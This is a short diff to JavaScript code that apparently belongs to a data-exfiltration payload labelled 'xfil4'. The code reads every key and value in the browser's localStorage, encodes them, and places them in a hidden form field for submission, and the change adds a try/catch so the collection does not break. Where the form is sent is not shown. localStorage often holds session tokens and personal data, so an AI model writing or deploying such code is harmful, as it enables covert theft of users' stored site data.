@@ -52,6 +52,7 @@ document.body.appendChild(elem);
   input.type = "hidden";
   input.name = "localStorage";
          str = "";
+	     try {
 for(var i=0, len=localStorage.length; i<len; i++) {
 	if (str.length)
 		str += "&";
@@ -59,6 +60,9 @@ for(var i=0, len=localStorage.length; i<len; i++) {
     var value = localStorage[key];
     str += encodeURIComponent(key) + "=" + encodeURIComponent(value);
   }
+		     }catch(error) {  
+			     str = "<unknown>";
+		     }
   input.value = str;
   form.appendChild(input);
   }, "xfil4");
